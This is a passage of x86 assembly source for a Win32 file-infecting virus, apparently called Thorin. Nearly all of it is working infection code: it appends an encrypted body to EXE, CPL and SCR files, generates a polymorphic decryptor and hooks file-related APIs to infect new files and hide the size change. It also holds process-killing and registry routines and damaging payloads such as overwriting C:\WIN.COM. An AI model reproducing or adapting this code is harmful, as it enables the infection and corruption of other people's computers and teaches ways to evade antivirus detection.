ASF_Loop:
	xor     eax,eax                         ; Clear EAX
	lodsb                                   ; Load size of string in AL
	cmp     al,0BBh                         ; End of table?
	jz      AllShitFilesProcessed           ; Oh, shit!
	xchg    eax,ecx                         ; Put Size in ECX
	push    edi                             ; Preserve program pointer
	rep     cmpsb                           ; Compare both strings
	pop     edi                             ; Restore program pointer
	jz      ShitFileFound                   ; Damn, a shitty file!
	add     esi,ecx                         ; Pointer to another string
	jmp     ASF_Loop                        ; in table & loop
AllShitFilesProcessed:
	mov     cl,00h                          ; Overlap, so CL = 0F9h
	org     $-1
ShitFileFound:
	stc                                     ; Set carry
	ret

; ===========================================================================
; PE Infection (with parameters)
; ===========================================================================
;
; input:
;        EDI = Pointer to file name
; output:
;        Nothing.
;

_Infection:
	push    edi
	apicall _GetFileAttributesA
	cmp_    eax,_ExitInfection
	mov     dword ptr [ebp+WFD_dwFileAttributes],eax       

	mov     esi,edi
	call    OpenFile
	cmp_    eax,_ExitInfection

	push    eax

	push    00000000h
	push    eax
	apicall _GetFileSize
	mov     dword ptr [ebp+WFD_nFileSizeLow],eax

	apicall _CloseHandle

	lea     esi,[ebp+WFD_szFileName]
	xchg    esi,edi
duhast: lodsb
	or      al,al
	jz      engel
	stosb
	jmp     duhast
engel:  stosb
	push    dword ptr [ebp+NewEIP]
	push    dword ptr [ebp+OldEIP]
	push    dword ptr [ebp+ModBase]
	call    Infection
	pop     dword ptr [ebp+ModBase]
	pop     dword ptr [ebp+OldEIP]
	pop     dword ptr [ebp+NewEIP]

	mov     cl,00h                          ; Overlapppppp
	org     $-1
_ExitInfection:
	stc
	ret

; ===========================================================================
; PE Infection (with WIN32_FIND_DATA)
; ===========================================================================
;
; input:
;        Nothing (everything needed is in WFD structure).
; output:
;        Nothing.
;

Infection:
	lea     esi,[ebp+WFD_szFileName]        ; Get FileName to infect
	push    80h
	push    esi
	apicall _SetFileAttributesA             ; Wipe its attributes

	call    OpenFile                        ; Open it

	cmp_    eax,CantOpen
	mov     dword ptr [ebp+FileHandle],eax

	mov     ecx,dword ptr [ebp+WFD_nFileSizeLow] ; 1st we create map with
	call    CreateMap                       ; its exact size
	cmpz_   eax,CloseFile

	mov     dword ptr [ebp+MapHandle],eax

	mov     ecx,dword ptr [ebp+WFD_nFileSizeLow]
	call    MapFile                         ; Map it
	cmpz_   eax,UnMapFile

	mov     dword ptr [ebp+MapAddress],eax

	mov     esi,eax                         ; Get PE Header
	mov     esi,[esi+3Ch]
	add     esi,eax
	cmp     dword ptr [esi],"EP"            ; Is it PE?
	jnz     NoInfect

	cmp     dword ptr [esi+mark],ddInfMark  ; Was it infected?
	jz      NoInfect
       
	push    dword ptr [ebp+MapAddress]
	apicall _UnmapViewOfFile

	push    dword ptr [ebp+MapHandle]
	apicall _CloseHandle

	mov     ecx,dword ptr [ebp+WFD_nFileSizeLow] ; And Map all again.
	add     ecx,virus_size
	call    CreateMap
	cmpz_   eax,CloseFile

	mov     dword ptr [ebp+MapHandle],eax

	mov     ecx,dword ptr [ebp+WFD_nFileSizeLow]
	add     ecx,virus_size
	call    MapFile
	cmpz_   eax,UnMapFile
	mov     dword ptr [ebp+MapAddress],eax

	mov     esi,eax
	mov     esi,[eax+3Ch]
	add     esi,eax

	call    GetLastSection                  ; ESI = Last Section
						; EDI = PE header

	mov     eax,[edi+28h]                   ; Save original EIP
	mov     dword ptr [ebp+OldEIP],eax
	
	mov     edx,[esi+10h]
	mov     ebx,edx
	add     edx,[esi+14h]                   ; EDX = Phisical address where
						; append virus

	push    edx

	mov     eax,ebx
	add     eax,[esi+0Ch]                   ; EAX = VA of new EIP
	mov     [edi+28h],eax                   ; Set the new entrypoint
	mov     dword ptr [ebp+NewEIP],eax

	mov     eax,[esi+10h]                   ; Retrieve new SizeOfRawData
	add     eax,virus_size                  ; and VirtualSize
	mov     ecx,[edi+3Ch]
	call    Align

	mov     [esi+10h],eax                   ; Set new SizeOfRawData
	mov     [esi+08h],eax                   ; Set new VirtualSize

	pop     edx

	mov     eax,[esi+10h]                   ; Set new SizeOfImage
	add     eax,[esi+0Ch]
	mov     [edi+50h],eax

	and     dword ptr [edi+0A0h],00h        ; Nulify the relocs, so they
	and     dword ptr [edi+0A4h],00h        ; won't fuck us :)

	or      dword ptr [esi+24h],section_flags ; Set new section attributes

	mov     dword ptr [edi+mark],ddInfMark  ; Mark infected files

	push    dword ptr [ebp+WFD_nFileSizeLow]
	pop     dword ptr [edi+orig_size]       ; Store orig. size for stealth

	push    dword ptr [edi+3Ch]
	push    dword ptr [ebp+infections]
	and     dword ptr [ebp+infections],00h

; Some RDA stuff

	push    edi esi edx                     ; Save ESI and EDI for later
	lea     esi,[ebp+crypto]
	mov     edi,encrypt_size
	call    CRC32                           ; Obtain virus CRC32
	pop     edx esi edi
	mov     dword ptr [ebp+CRC],eax         ; Store it

	push    edx
	apicall _GetTickCount                   ; Get a random number as seed
	xchg    ebx,eax                         ; for RDA encryption
	pop     edx

; Append virus & RDA encryption
	
	mov     edi,dword ptr [ebp+MapAddress]  ; Write non crypted part
	add     edi,edx
	push    edi
	lea     esi,[ebp+virus_start]
	mov     ecx,non_crypt_size
	cld
	rep     movsb

	mov     ecx,encrypt_size                ; Encrypt and copy the rest
cryptl: lodsb
	xor     al,bl
	stosb
	loop    cryptl
	pop     edi

; Poly decryptor generation

	lea     eax,[ebp+random_seed]           ; Get a slow seed for poly
	push    eax
	apicall _GetSystemTime

	mov     eax,poly_virus_size             ; Obtain exactly a reliable
	mov     ecx,4                           ; value of virus_size divided
	call    Align                           ; by 4
	shr     eax,2
	xchg    eax,ecx

	mov     esi,edi
	add     esi,LIMIT
	call    THME                            ; generate the poly decryptor

	pop     dword ptr [ebp+infections]

	mov     eax,edi                         ; Trunc file
	sub     eax,dword ptr [ebp+MapAddress]
	pop     ecx
	call    Align
	xchg    eax,ecx
	call    TruncFile

	jmp     UnMapFile
NoInfect:
	stc
	dec     byte ptr [ebp+infections]       ; Shit, if we are here, 
	mov     ecx,dword ptr [ebp+WFD_nFileSizeLow] ; something failed :(
	call    TruncFile

UnMapFile:
	push    dword ptr [ebp+MapAddress]      ; Close map view of file
	apicall _UnmapViewOfFile

CloseMap:
	push    dword ptr [ebp+MapHandle]       ; Close map handle
	apicall _CloseHandle

CloseFile:
	push    dword ptr [ebp+FileHandle]      ; Close file handle
	apicall _CloseHandle

CantOpen:
	push    dword ptr [ebp+WFD_dwFileAttributes]
	lea     eax,[ebp+WFD_szFileName]        ; Restore old attributes
	push    eax
	apicall _SetFileAttributesA
	ret

	db      0,"[Welcome to the Middle-Earth, my dear friend]",0

; ===========================================================================
; Tiny method for get KERNEL32 base address
; ===========================================================================
;
; input:
;        ESI = Program return address
;        ECX = Limit of pages where search
; output:
;        EAX = Base address of KERNEL32.dll
;

GetK32          proc                            ; My own little GetK32 :)
	and     esi,0FFFF0000h
_@1:    jecxz   WeFailed                        ; Thanx to Super for the idea
	cmp     word ptr [esi],"ZM"             ; and Qozah for notifying me
	jz      CheckPE                         ; a little error (Thnx man!)
_@2:    sub     esi,10000h
	dec     ecx
	jmp     _@1

CheckPE:
	mov     edi,[esi+3Ch]
	add     edi,esi
	cmp     dword ptr [edi],"EP"
	jz      WeGotK32
	jmp     _@2
WeFailed:
	cmp     byte ptr [ebp+inNT],00h         ; Otherwise, hardcode to the
	jz      W9X                             ; proper OS.
	mov     esi,kernel_wNT                  ; NT = 77F00000h
	jmp     WeGotK32
W9X:    mov     esi,kernel_                     ; 9X = BFF70000h
WeGotK32:
	xchg    eax,esi
	ret
GetK32          endp

; ===========================================================================
; Retrieve API addresses (from Export Table)
; ===========================================================================
;
; input:
;        EDI = Pointer to where you want the first API Address
;        ESI = Pointer to the first API Name
; output:
;        Nothing.
;

GetAPIs         proc
@@1:    push    esi
	push    edi
	call    GetAPI_ET
	pop     edi
	pop     esi

	stosd

	xchg    edi,esi

	xor     al,al
@@2:    scasb
	jnz     @@2

	xchg    edi,esi

@@3:    cmp     byte ptr [esi],0BBh
	jz      @@4
	jmp     @@1
@@4:    ret
GetAPIs         endp

; ===========================================================================
; Retrieve API address (from Export Table)
; ===========================================================================
;
; input:
;        ESI = Pointer to API Name
; output:
;        EAX = API address
;

GetAPI_ET       proc
	mov     edx,esi
	mov     edi,esi

	xor     al,al
@_1:    scasb
	jnz     @_1

	sub     edi,esi                         ; EDI = API Name size
	mov     ecx,edi

	xor     eax,eax
	mov     esi,3Ch
	rva2va  esi,kernel

	lodsw
	rva2va  eax,kernel

	mov     esi,[eax+78h]
	add     esi,1Ch
	rva2va  esi,kernel

	lodsd
	rva2va  eax,kernel
	mov     dword ptr [ebp+AddressTableVA],eax
	lodsd

	rva2va  eax,kernel
	push    eax                             ; mov [NameTableVA],eax   =)
	lodsd

	rva2va  eax,kernel

	mov     dword ptr [ebp+OrdinalTableVA],eax
	pop     esi

        xor     ebx,ebx

@_3:    push    esi
	lodsd

	rva2va  eax,kernel
	mov     esi,eax
	mov     edi,edx

	push    ecx
	cld
	rep     cmpsb
	pop     ecx
	jz      @_4
	pop     esi
	add     esi,4
        inc     ebx
	jmp     @_3

@_4:
	pop     esi
        xchg    eax,ebx
	shl     eax,1
	add     eax,dword ptr [ebp+OrdinalTableVA]
	xor     esi,esi
	xchg    eax,esi
	lodsw
	shl     eax,2
	add     eax,dword ptr [ebp+AddressTableVA]
	xchg    esi,eax
	lodsd
	rva2va  eax,kernel
	ret
GetAPI_ET       endp

; ===========================================================================
; Retrieve API address (from Import Table)
; ===========================================================================
;
; input:
;        EDI = Offset of API address to retrieve
; output:
;        EAX = Address of the API
;        EBX = Address of the API address in the import
;

GetAPI_IT       proc
	mov     dword ptr [ebp+TempGA_IT1],edi
	mov     ebx,edi
	xor     al,al
	scasb
	jnz     $-1
	sub     edi,ebx

	mov     dword ptr [ebp+TempGA_IT2],edi

	xor     eax,eax
	mov     esi,dword ptr [ebp+imagebase]
	add     esi,3Ch
	lodsw
	add     eax,dword ptr [ebp+imagebase]
	xchg    esi,eax
	lodsd

	cmp     eax,"EP"
	jnz     nopes

	add     esi,7Ch
	lodsd
	push    eax
	lodsd
	mov     ecx,eax
	pop     esi
	add     esi,dword ptr [ebp+imagebase]
	
SearchK32:
	push    esi
	mov     esi,[esi+0Ch]
	add     esi,dword ptr [ebp+imagebase]
	lea     edi,[ebp+K32_DLL]
	mov     ecx,K32_Size
	cld
	push    ecx
	rep     cmpsb
	pop     ecx
	pop     esi
	jz      gotcha
	add     esi,14h
	jmp     SearchK32
gotcha:
	cmp     byte ptr [esi],00h
	jz      nopes
	mov     edx,[esi+10h]
	add     edx,dword ptr [ebp+imagebase]
	lodsd
	jz      nopes

	xchg    edx,eax
	add     edx,[ebp+imagebase]
	xor     ebx,ebx
loopy:
	cmp     dword ptr [edx+00h],00h
	jz      nopes
	cmp     byte ptr  [edx+03h],80h
	jz      reloop
	
	mov     edi,dword ptr [ebp+TempGA_IT1]
	mov     ecx,dword ptr [ebp+TempGA_IT2]
	mov     esi,[edx]
	add     esi,dword ptr [ebp+imagebase]
	add     esi,2
	push    ecx
	rep     cmpsb
	pop     ecx
	jz      wegotit
reloop:
	inc     ebx
	add     edx,4
	loop    loopy
wegotit:
	shl     ebx,2
	add     ebx,eax
	mov     eax,[ebx]
	db      0B1h
nopes:
	stc
	ret
GetAPI_IT       endp

; ===========================================================================
; Payloads
; ===========================================================================
; White trash get down on your knees... and you'll get cake and sodomy!

payload         proc
        apicall _GetTickCount                   ; Get a random payload
	and     eax,payload_number
	lea     esi,[ebp+payload_table+eax*4]
	lodsd
	add     eax,ebp
	call    eax                             ; Call to it
	ret
payload         endp

payload1        proc
	push    00000000h                       ; Mmm, a new win.com :)
	push    00000080h
	push    00000002h
	push    00000000h
	push    00000001h
	push    40000000h
	call    ___
	db      "C:\WIN.COM",0
___:    apicall _CreateFileA
	push    eax
	push    00000000h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    p_size
	lea     ebx,[ebp+payl0ad]
	push    ebx
	push    eax
	apicall _WriteFile
	apicall _CloseHandle
	ret
payload1        endp

payload2        proc
	call    __
	db      "THORIN",0                      ; HD Name is... THORIN :)
__:     push    00000000h
	apicall _SetVolumeLabelA
	ret
payload2        endp

payload3        proc
	push    00000001h
	apicall _SwapMouseButton                ; Left is right, right is left
	ret
payload3        endp

payload4        proc
	push    00001010h                       ; Display message
	lea     eax,[ebp+vname]
	push    eax
	call    _2

; Stupid message to annoy user... panic ain't good, but... what is good? ;)

	db      "Thorin... Thorin... Thorin... Thorin... Thorin...",13,13
	db      "I am Thorin, son of Thrain, son of Thror",13
	db      "and your computer is mine... mwahahahahaha!",13
	db      "I will give you... the death you deserve!",13,13
	db      "...Thorin ...Thorin ...Thorin ...Thorin ...Thorin",0

_2:     push    00000000h
	apicall _MessageBoxA
payload4        endp

payload5        proc
	lea     ebx,[ebp+szSHELL32]
	push    ebx
	apicall _LoadLibraryA                   ; Get SHELL32 base address
	lea     ecx,[ebp+@ShellExecuteA]        
	push    ecx
	push    eax
	apicall _GetProcAddress                 ; Get ShellExecuteA address
	xor     ebx,ebx
	push    ebx
	push    ebx
	push    ebx
	lea     ecx,[ebp+szMicro$oft]
	push    ecx
	lea     ecx,[ebp+szOPEN]
	push    ecx
	push    ebx
	call    eax                             ; Open Micro$oft web
	ret
payload5        endp

; ===========================================================================
; Some miscellaneous functions
; ===========================================================================
; ALIGN
;
; input:
;       EAX = Number to align
;       ECX = Alignment factor
; output:
;       EAX = Aligned number
;

Align           proc
	push    edx
	xor     edx,edx
	push    eax
	div     ecx
	pop     eax
	sub     ecx,edx
	add     eax,ecx
	pop     edx
	ret
Align           endp

; TRUNCFILE
;
; input:
;       ECX = Where trunc file
; output:
;       Nothing.
;

TruncFile       proc
	xor     eax,eax
	push    eax
	push    eax
	push    ecx
	push    dword ptr [ebp+FileHandle]
	apicall _SetFilePointer
	push    dword ptr [ebp+FileHandle]
	apicall _SetEndOfFile
	ret
TruncFile       endp

; OPENFILE
;
; input:
;       ESI = Pointer to file
; output:
;       EAX = Handle (if succesful) / -1 (if failed)
;

OpenFile        proc
	xor     eax,eax
	push    eax
	push    eax
	push    00000003h
	push    eax
	inc     eax
	push    eax
	push    40000000h or 80000000h
	push    esi
	apicall _CreateFileA
	ret
OpenFile        endp

; CREATEMAP
;
; input:
;       ECX = Size to map
; output:
;       EAX = Handle (if succesful) / 0 (if failed)
;

CreateMap       proc
	xor     eax,eax
	push    eax
	push    ecx
	push    eax
	push    00000004h
	push    eax
	push    dword ptr [ebp+FileHandle]
	apicall _CreateFileMappingA
	ret
CreateMap       endp

; MAPFILE
;
; input:
;       ECX = Size to map
; output:
;       EAX = Handle (if succesful) / 0 (if failed)

MapFile         proc
	xor     eax,eax
	push    ecx
	push    eax
	push    eax
	push    000F001Fh
	push    dword ptr [ebp+MapHandle]
	apicall _MapViewOfFile
	ret
MapFile         endp

; REGEXIST
;
; input:
;       ESI = Pointer to key name
; output:
;       CF  = Set to 1 if it exist, to 0 if it doesn't
;

RegExist        proc
	lea     eax,[ebp+RegHandle]
	push    eax
	push    000F003Fh
	push    00000000h
	push    esi
	push    80000001h
	apicall _RegOpenKeyExA
	cmp     eax,2
	jz      RegExistExitCF0
	push    dword ptr [ebp+RegHandle]
	apicall _CloseHandle
	stc
	ret
RegExistExitCF0:
	clc
	ret
RegExist        endp

; PUTREG
;
; input:
;       ESI = Pointer to key name
; output:
;       Nothing.
;

PutReg          proc
	lea     eax,[ebp+Disposition]
	push    eax
	lea     eax,[ebp+RegHandle]
	push    eax
	xor     eax,eax
	push    eax
	push    000F003Fh
	push    eax
	push    eax
	push    eax
	push    esi
	push    80000001h
	apicall _RegCreateKeyExA
	push    dword ptr [ebp+RegHandle]
	apicall _CloseHandle
	ret
PutReg          endp

; DELREG
;
; input:
;       ESI = Pointer to key name
; output:
;       Nothing.
;

DelReg          proc
	push    esi
	push    80000001h
	apicall _RegDeleteKeyA
	ret
DelReg          endp

; TERMINATEPROC
;
; input:
;       EDI = Pointer to the name of the window of the process we wanna kill
; output:
;       CF  = Set to 1 if it wasn't found or killed, to 0 if it was killed
;

TerminateProc   proc
	xor     ebx,ebx                                 ; Thnx 2 Bennyg0d :)
	push    edi
	push    ebx
	apicall _FindWindowA
	xchg    eax,ecx
	jecxz   TP_ErrorExit
	push    ebx
	push    ebx
	push    00000012h
	push    ecx
	apicall _PostMessageA
	mov     cl,00h
	org     $-1
TP_ErrorExit:
	stc
	ret
TerminateProc   endp

; GETLASTSECTION
;
; input:
;       ESI = Pointer to PE header
; output:
;       ESI = Pointer to last section
;       EDI = Pointer to PE header
;

GetLastSection  proc
	mov     edi,esi
	movzx   eax,word ptr [edi+06h]          ; Get ptr to last section
	dec     eax
	imul    eax,eax,28h                     ; C'mon, feel the noise...
	add     esi,eax
	add     esi,78h
	mov     edx,[edi+74h]
	shl     edx,03h
	add     esi,edx
	ret
GetLastSection  endp

; ===========================================================================
; Get Delta Offset
; ===========================================================================
;
; input:
;       Nothing.
; output:
;       ECX = Delta Offset
;

GetDeltaOffset  proc
	call    getitright                      ; Oh! What is this? Incredible!
getitright:
	pop     ebp
	sub     ebp,offset getitright
	ret
GetDeltaOffset   endp

; ===========================================================================
; Dropper unpacker (25 bytes) <<->> [LSCE] - Little Shitty Compression Engine
; ===========================================================================
;
; ???     ??????? ??????? ??????? 
; ? ?     ? ????? ? ????? ? ????? The Little and Shitty Compression Engine
; ? ????? ????? ? ? ????? ? ????? Poorly coded and written by...
; ??????? ??????? ??????? ??????? Who cares? :) Well... by me. Any problem?
;
; This is a very simple packing engine, based in the repetition of zeros that
; the PE  files have, thus it is  able to compress a PE file... Hehehe, i can
; put a dropper without caring about  its space! That was  the only reason of
; make this little shit. Maybe one day i will make a 'real' compression engi-
; ne, but today i'm too busy :)
;
; input:
;        EDI = Offset where unpack
;        ESI = Data to unpack
;        ECX = Size of packed data
; output:
;        Nothing.
;

LSCE_UnPack     proc
	xor     eax,eax                         ; 2 bytes       Hehehe, i
process_byte:                                   ;               think i'm
	lodsb                                   ; 1 byte        turning a
	or      al,al                           ; 2 bytes       little bit
	jnz     store_byte                      ; 2 bytes       paranoid...
	dec     ecx                             ; 1 byte
	dec     ecx                             ; 1 byte
	lodsw                                   ; 2 bytes
	push    ecx                             ; 1 byte
	xor     ecx,ecx                         ; 2 bytes
	xchg    eax,ecx                         ; 1 byte
	rep     stosb                           ; 2 bytes
	pop     ecx                             ; 1 byte
	loop    process_byte                    ; 2 bytes
	jecxz   all_unpacked                    ; 2 bytes
store_byte:
	stosb                                   ; 1 byte
	loop    process_byte                    ; 2 bytes
all_unpacked:
	ret                                     ; 2 bytes
LSCE_UnPack      endp

; ===========================================================================
; Hook all the possible APIs, of host IT
; ===========================================================================

HookAllAPIs:
	mov     eax,dword ptr [ebp+ModBase]     ; file modbase=file imagebase
	mov     dword ptr [ebp+imagebase],eax

	lea     edi,[ebp+@@Hookz]               ; Ptr to the first API
nxtapi: push    edi
	call    GetAPI_IT                       ; Get it from Import Table
	pop     edi
	jc      Next_IT_Struc_                  ; Fail? Damn...

	xor     al,al                           ; Reach the end of API string
	scasb
	jnz     $-1

	mov     eax,[edi]                       ; All must be in its place :)
	add     eax,ebp
	mov     [ebx],eax
Next_IT_Struc:
	add     edi,4
	cmp     byte ptr [edi],""              ; Reach the last api? Grrr...
	jz      AllHooked
	jmp     nxtapi
AllHooked:
	ret

Next_IT_Struc_:
	xor     al,al
	scasb
	jnz     $-1
	jmp     Next_IT_Struc

; A bard was our savior!

	db      0,"[Glory to the Bards!]",0

; ===========================================================================
; Hooks' code
; ===========================================================================

HookMoveFileA:
	call    DoHookStuff
	jmp     [eax+_MoveFileA]

HookCopyFileA:
	call    DoHookStuff
	jmp     [eax+_CopyFileA]

HookGetFullPathNameA:
	call    DoHookStuff
	jmp     [eax+_GetFullPathNameA]

HookDeleteFileA:
	call    DoHookStuff
	jmp     [eax+_DeleteFileA]

HookWinExec:
	call    DoHookStuff
	jmp     [eax+_WinExec]

HookCreateFileA:
	call    DoHookStuff
	jmp     [eax+_CreateFileA]

HookCreateProcessA:
	call    DoHookStuff
	jmp     [eax+_CreateProcessA]       

HookGetFileAttributesA:
	call    DoHookStuff
	jmp     [eax+_GetFileAttributesA]

HookFindFirstFileA:
	pushad                                  ; Save all reggies
	call    GetDeltaOffset                  ; EBP = Delta Offset
	mov     eax,[esp+20h]                   ; EAX = Return Address
	mov     dword ptr [ebp+FFRetAddress],eax
	mov     eax,[esp+28h]                   ; EAX = Ptr to WFD
	mov     dword ptr [ebp+FF_WFD],eax

        mov     [esp.PUSHAD_EAX],ebp
	popad
        add     esp,4                           ; Remove this ret address from
						; stack

	call    [eax+_FindFirstFileA]           ; Call original API

	test    eax,eax                         ; Fail? Shit...
	jz      FF_GoAway

	pushad                                  ; Save reggies and flaggies
	pushfd

	call    GetDeltaOffset                  ; Delta again

	movzx   ebx,byte ptr [ebp+WFD_Handles_Count] ; Number of active hndlers
	mov     edx,[ebp+WFD_HndInMem]          ; Our Handle table in mem

	mov     esi,12345678h                   ; Ptr to filename
FF_WFD  equ     $-4
	add     esi,(offset WFD_szFileName-offset WIN32_FIND_DATA)

	cmp     ebx,n_Handles                   ; Over max hnd storing?
	jae     AvoidStoring                    ; Shit...

; WFD_Handles structure
; ?????????????????????
;       +00h    WFD Handle
;       +04h    Address of its WIN32_FIND_DATA

	mov     dword ptr [edx+ebx*8],eax       ; Store Handle
	mov     dword ptr [edx+ebx*8+4],esi     ; Store WFD offset

	inc     byte ptr [ebp+WFD_Handles_Count]
      
AvoidStoring:
	push    esi
	call    Check4ValidFile                 ; Is a reliable file 4 inf?
	pop     edi 
	jc      FF_AvoidInfekt                  ; Duh!

	push    edi
	call    _Infection                      ; Infect it
	pop     esi

	call    Info4Stealth                    ; Get, if available, old file's
						; size
	jc      FF_AvoidInfekt

	mov     ecx,dword ptr [ebp+FF_WFD]
	add     ecx,(offset WFD_nFileSizeLow-offset WIN32_FIND_DATA)
	mov     [ecx],eax                       ; Size stealth!

FF_AvoidInfekt:
	popfd
	popad

FF_GoAway:                                      ; Return to caller
	push    12345678h
FFRetAddress equ $-4
	ret

HookFindNextFileA:
	pushad                                  ; Save all reggies
	call    GetDeltaOffset                  ; Get delta offset
	mov     eax,[esp+20h]                   ; EAX = Return address
	mov     dword ptr [ebp+FNRetAddress],eax
	mov     eax,[esp+24h]                   ; EAX = Search Handle
	mov     dword ptr [ebp+FN_Hnd],eax
        mov     [esp.PUSHAD_EAX],ebp
	popad

        add     esp,4

	call    [eax+_FindNextFileA]            ; Call original API
	or      eax,eax                         ; Fail? Damn.
	jz      FN_GoAway

	pushad                                  ; Save regs and flags
	pushfd

	call    GetDeltaOffset                  ; Get delta again

	mov     eax,12345678h                   ; EAX = Search Handle
FN_Hnd  equ     $-4

	call    Check4ValidHandle               ; Is in our table? If yes,
	jc      FN_AvoidInfekt                  ; infect.

	xchg    esi,eax                         ; ESI = Pointer to WFD

	mov     dword ptr [ebp+FN_FS],esi       ; Save if for later
	add     esi,(offset WFD_szFileName-offset WIN32_FIND_DATA)
	push    esi                             ; ESI = Ptr to filename
	call    Check4ValidFile                 ; Is reliable its inf.?
	pop     edi     
	jc      FN_AvoidInfekt                  ; Duh...
	push    edi
	call    _Infection                      ; Infect it !
	pop     esi
	call    Info4Stealth                    ; Retrieve info for possible
						; stealth...
	jc      FN_AvoidInfekt

	mov     ecx,12345678h
FN_FS   equ     $-4
	add     ecx,(offset WFD_nFileSizeLow-offset WIN32_FIND_DATA)
	mov     [ecx],eax                       ; Size Stealth, dude!

FN_AvoidInfekt:
	popfd                                   ; Restore flags & regs
	popad

FN_GoAway:                                      ; Return to caller
	push    12345678h
FNRetAddress equ $-4
	ret

HookGetProcAddress:
	pushad                                  ; Save all the registers
	call    GetDeltaOffset                  ; EBP = Delta Offset
	mov     eax,[esp+24h]                   ; EAX = Base address of module
	cmp     eax,dword ptr [ebp+kernel]      ; Is EAX=K32?
	jnz     OriginalGPA                     ; If not, it's not our problem
        mov     [esp.PUSHAD_EAX],ebp
	popad
	pop     dword ptr [eax+HGPA_RetAddress] ; Put ret address in a safe place

	call    [eax+_GetProcAddress]           ; Call original API
	or      eax,eax                         ; Fail? Duh!
	jz      HGPA_SeeYa

	pushad
	xchg    eax,ebx                         ; EBX = Address of function

	call    GetDeltaOffset                  ; EBP = Delta offset

	mov     ecx,n_HookedAPIs                ; ECX = Number of hooked apis
	lea     esi,[ebp+@@HookedOffsetz]       ; ESI = Ptr to array of API
						; addresses
	xor     edx,edx                         ; EDX = Counter (set to 0)
HGPA_IsHookableAPI?:
	lodsd                                   ; EAX = API from array
	cmp     ebx,eax                         ; Is equal to requested address?
	jz      HGPA_IndeedItIs                 ; If yes, it's interesting 4 us
	inc     edx                             ; Increase counter
	loop    HGPA_IsHookableAPI?             ; Search loop
	jmp     OriginalGPAx

HGPA_IndeedItIs:
	lea     edi,[ebp+@@Hookz]               ; EDI = Ptr to hooked API strings
	xor     ebx,ebx                         ; EBX = New counter
HGPA_AndWhatAPI?:
	cmp     edx,ebx                         ; We want EBX = EDX
	jz      HGPA_ThisAPI
	xor     al,al                           ; Travel trough the Hooks
	scasb                                   ; structure
	jnz     $-1
	add     edi,4
	inc     ebx
	jmp     HGPA_AndWhatAPI?
HGPA_ThisAPI:
	xor     al,al                           ; EDI = Points to requested
	scasb                                   ; api string
	jnz     $-1
	mov     eax,[edi]                       ; Get its offset
	add     eax,ebp                         ; Adjust it to delta
        mov     [esp.PUSHAD_EAX],eax
	popad

HGPA_SeeYa:
	push    12345678h
HGPA_RetAddress equ $-4
	ret

OriginalGPAx:
        mov     [esp.PUSHAD_EAX],ebp
        popad
	push    dword ptr [eax+HGPA_RetAddress]
	jmp     [eax+_GetProcAddress]

OriginalGPA:
        mov     [esp.PUSHAD_EAX],ebp
        popad
	jmp     [eax+_GetProcAddress]

; ===========================================================================
; Hooked "standard" APIs handler
; ===========================================================================

DoHookStuff:
	pushad
	pushfd
	call    GetDeltaOffset
	mov     edx,[esp+2Ch]                   ; Get filename to infect
	mov     esi,edx
	call    Check4ValidFile
	jc      ErrorDoHookStuff
InfectWithHookStuff:
	xchg    edi,edx
	call    _Infection
ErrorDoHookStuff:
	popfd                                   ; Preserve all as if nothing
	popad                                   ; happened :)
	push    ebp
	call    GetDeltaOffset                  ; Get delta offset 
	xchg    eax,ebp
	pop     ebp
	ret

; ===========================================================================
; Retrieve information for size-stealth
; ===========================================================================
;
; input:
;       ESI = Pointer to file name
; output:
;       EAX = Old Size (Stored at PE Header+44h)
;       CF  = Set to 1 if error (file not infected, I/O, etc)
;

Info4Stealth:
	and     byte ptr [ebp+CoolFlag],00h     ; Flag to 0

	call    OpenFile                        ; Open File
	cmp_    eax,I4S_Error

	mov     dword ptr [ebp+FileHandle],eax  ; Store its handler

	push    00000000h                       ; Get file's size
	push    eax
	apicall _GetFileSize
	xchg    eax,ecx

	push    ecx                             ; Create its mapping
	call    CreateMap
	pop     ecx

	cmpz_   eax,I4S_Error_CloseFileHnd

	mov     dword ptr [ebp+MapHandle],eax   ; Save handler
	
	call    MapFile                         ; Create a mapping view
	cmpz_   eax,I4S_Error_CloseMapHnd

	mov     dword ptr [ebp+MapAddress],eax  ; Store mapping address

	mov     esi,[eax+3Ch]
	add     esi,eax
	cmp     dword ptr [esi],"EP"            ; Is it PE?
	jnz     I4S_Error_UnMapHnd

	push    dword ptr [esi+orig_size]       ; Get original's file size
	pop     dword ptr [ebp+OldSize]         ; And put it in a temp place

	inc     byte ptr [ebp+CoolFlag]         ; Set flag to 1

I4S_Error_UnMapHnd:
	push    dword ptr [ebp+MapAddress]      ; Close map view of file
	apicall _UnmapViewOfFile

I4S_Error_CloseMapHnd:
	push    dword ptr [ebp+MapHandle]       ; Close map handle
	apicall _CloseHandle

I4S_Error_CloseFileHnd:
	push    dword ptr [ebp+FileHandle]      ; Close file handle
	apicall _CloseHandle

	cmp     byte ptr [ebp+CoolFlag],00h     ; Were we able to open? If yes,
	jz      I4S_Error                       ; leave stack clear...

I4S_Successful:
	mov     eax,12345678h
OldSize equ     $-4
	mov     cl,00h
	org     $-1
I4S_Error:
	stc
	ret

; ===========================================================================
; Check if file infection is reliable 
; ===========================================================================
;
; input:
;       ESI = Pointer to file name
; output:
;       CF  = Set to 1 if it's reliable, to 0 if it isn't
;

Check4ValidFile:
	lodsb
	or      al,al                           ; Find NULL? Shit...
	jz      C4VF_Error
	cmp     al,"."                          ; Dot found? Interesting...
	jnz     Check4ValidFile
	dec     esi
	lodsd                                   ; Put extension in EAX
	or      eax,20202020h                   ; Make string locase
	not     eax
	cmp     eax,not "exe."                  ; Is it an EXE? Infect!!!
	jz      C4VF_Successful
	cmp     eax,not "lpc."                  ; Is it a CPL? Infect!!!
	jz      C4VF_Successful
	cmp     eax,not "rcs."                  ; Is is a SCR? Infect!!!
	jnz     C4VF_Error
C4VF_Successful:
	mov     cl,00h
	org     $-1
C4VF_Error:
	stc
	ret

; ===========================================================================
; Check if handle was stored previously
; ===========================================================================
;
; input:
;       EAX = Handle
; output:
;       EAX = WFD Offset of given handle
;       EDX = Places what it occupies in WFD_Handles structure
;       CF  = Set to 1 if it's found, to 0 if it wasn't
;

Check4ValidHandle:
	xor     edx,edx
	mov     edi,[ebp+WFD_HndInMem]
C4VH_l00p:
	cmp     edx,n_Handles                   ; Over limits? Shit...
	jae     C4VH_Error

	cmp     eax,[edx*8+edi]                 ; EAX = a handler stored in
	jz      C4VH_Successful                 ; table

	inc     edx                             ; Increase counter
	jmp     C4VH_l00p
C4VH_Successful:
	mov     eax,[edx*8+edi+4]               ; EAX = WFD Offset

	mov     cl,00h
	org     $-1
